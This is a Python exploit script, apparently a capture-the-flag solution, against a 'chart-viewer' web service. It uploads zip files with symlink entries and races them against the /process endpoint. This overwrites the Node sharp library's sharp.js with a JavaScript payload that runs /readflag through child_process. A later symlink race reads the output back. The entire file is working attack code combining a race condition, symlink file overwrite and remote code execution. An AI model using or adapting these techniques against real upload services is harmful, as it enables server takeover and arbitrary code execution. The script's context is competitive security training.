import base64
import io
import threading
import time
import zipfile

import requests

BASE = 'https://chart-viewer-0da736d671f5.instancer.sekai.team'


def make_zip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        for entry in entries:
            name = entry['name']
            data = entry.get('data', b'')
            mode = entry.get('mode', 0o100644)
            zi = zipfile.ZipInfo(name)
            zi.create_system = 3
            zi.external_attr = mode << 16
            z.writestr(zi, data)
    return buf.getvalue()


def upload_file(name, data, content_type='application/zip'):
    files = {'file': (name, data, content_type)}
    resp = requests.post(f"{BASE}/upload", files=files, data={'name': name})
    return resp


def trigger_process(name, file_param, replace_fn, delay=0.35):
    def do_request():
        r = requests.get(f"{BASE}/process", params={'name': name, 'file': file_param})
        print(f"process {name}:", r.status_code, r.text[:150])
    thread = threading.Thread(target=do_request)
    thread.start()
    time.sleep(delay)
    resp = replace_fn()
    print(f"reupload {name}:", resp.status_code, resp.text[:120])
    thread.join()

SYMLINK_MODE = 0o120777

# Cleanup done externally

# Stage1: prepare safe zip and create symlink a -> sharp.js
safe_zip = make_zip([
    {'name': 'x', 'data': b'safe'}
])
print('stage1 safe upload', upload_file('a', safe_zip).status_code)

symlink_zip = make_zip([
    {'name': 'x', 'data': b'safe'},
    {'name': 'a', 'data': b'/app/node_modules/sharp/lib/sharp.js', 'mode': SYMLINK_MODE}
])
trigger_process('a', 'x', lambda: upload_file('a', symlink_zip))

# Stage2: overwrite sharp.js via copy with raw JS payload
payload_js = """'use strict';\nconst fs = require('node:fs');\nconst cp = require('node:child_process');\ntry {\n  const flag = cp.execSync('/readflag', { encoding: 'utf8' });\n  fs.writeFileSync('/tmp/uploads/pwned', flag);\n} catch (e) {\n  try { fs.writeFileSync('/tmp/uploads/pwned', String(e)); } catch (_) {}\n}\nmodule.exports = require('@img/sharp-linux-x64/sharp.node');\n""".encode()

print('stage2 safe upload', upload_file('a', safe_zip).status_code)

def upload_raw_payload():
    return upload_file('a', payload_js, content_type='application/octet-stream')

trigger_process('a', 'x', upload_raw_payload)

# Trigger render to execute payload
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==')
r = requests.post(f"{BASE}/render", data=png, headers={'Content-Type': 'image/png'})
print('render:', r.status_code, r.text[:200])

# Stage3: leak flag through symlink to /tmp/uploads/pwned
safe_zip_b = make_zip([
    {'name': 'l', 'data': b'placeholder'}
])
print('stage3 safe upload', upload_file('b', safe_zip_b).status_code)

mal_zip_b = make_zip([
    {'name': 'l', 'data': b'/tmp/uploads/pwned', 'mode': SYMLINK_MODE}
])
trigger_process('b', 'l', lambda: upload_file('b', mal_zip_b))